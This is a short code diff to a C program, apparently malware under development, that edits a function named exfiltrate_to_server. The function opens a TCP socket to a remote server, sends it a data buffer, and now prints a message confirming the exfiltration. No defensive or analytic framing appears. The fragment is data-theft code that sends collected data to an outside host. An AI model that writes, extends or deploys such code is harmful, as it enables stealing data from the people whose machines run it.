@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <unistd.h>
@@ -17,11 +19,10 @@ void exfiltrate_to_server(const char *data, size_t size) {
 
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
         send(sock, data, size, 0);
-        send(sock, "\n---END---\n", 11, 0); // Ajoute un séparateur
+        printf("[Exfiltration] Data sent to server\n");
     } else {
-        perror("Connection failed");
+        perror("Connection to server failed");
     }
 
     close(sock);
 }
-
